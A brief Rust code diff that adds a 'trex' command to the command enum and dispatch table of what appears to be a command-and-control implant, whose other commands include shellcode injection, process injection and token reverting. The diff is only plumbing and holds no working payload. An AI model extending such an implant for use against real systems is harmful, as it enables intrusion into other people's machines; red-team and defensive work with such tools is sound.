@@ -912,6 +912,7 @@ enum JsonCommand {
         spawn_to: String,
         sc_hex: String,
     },
+    Trex,
     Exit,
 }
 
@@ -1024,6 +1025,7 @@ impl JsonCommand {
                     shellcode,
                 }
             }
+            JsonCommand::Trex => Command::Trex,
             JsonCommand::Exit => Command::Exit,
         })
     }
@@ -1469,6 +1471,7 @@ fn command_name(c: &Command) -> &'static str {
         Command::Rev2Self => "rev2self",
         Command::GetUid => "getuid",
         Command::Inject { .. } => "inject",
+        Command::Trex => "trex",
         Command::Exit => "exit",
     }
 }
